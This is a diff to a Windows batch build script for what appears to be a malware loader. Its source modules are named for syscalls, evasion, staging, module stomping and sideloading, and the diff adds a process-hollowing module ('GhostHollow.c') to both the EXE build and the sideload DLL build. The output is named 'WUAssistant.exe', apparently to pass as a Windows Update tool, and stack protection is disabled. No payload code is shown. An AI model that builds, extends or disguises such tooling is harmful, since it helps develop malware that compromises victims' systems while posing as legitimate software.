@@ -34,7 +34,7 @@ IF "%1"=="sideload" IF NOT EXIST Sideload.h (
 
 REM --- Default: EXE build ---
 SET OUTNAME=WUAssistant.exe
-SET CFILES=main.c Syscalls.c WinApi.c Evasion.c Crypt.c Staging.c Stomper.c Phantom.c Gadgets.c
+SET CFILES=main.c Syscalls.c WinApi.c Evasion.c Crypt.c Staging.c Stomper.c Phantom.c GhostHollow.c Gadgets.c
 SET CFLAGS=/O1 /GS- /W0 /std:c17 /nologo
 SET LFLAGS=/NODEFAULTLIB /ENTRY:Main /SUBSYSTEM:WINDOWS kernel32.lib user32.lib
 
@@ -48,7 +48,7 @@ IF NOT "%1"=="sideload" IF %UAC%==1 echo [*] UAC manifest enabled
 REM --- Override for sideload DLL build ---
 IF "%1"=="sideload" (
     SET OUTNAME=sideload.dll
-    SET CFILES=main.c Sideload.c Syscalls.c WinApi.c Evasion.c Crypt.c Staging.c Stomper.c Phantom.c Gadgets.c
+    SET CFILES=main.c Sideload.c Syscalls.c WinApi.c Evasion.c Crypt.c Staging.c Stomper.c Phantom.c GhostHollow.c Gadgets.c
     SET "CFLAGS=/O1 /GS- /W0 /std:c17 /nologo /DBUILD_DLL"
     SET "LFLAGS=/DLL /NODEFAULTLIB /ENTRY:DllMain /SUBSYSTEM:WINDOWS kernel32.lib user32.lib"
     echo [*] Building DLL sideload variant...
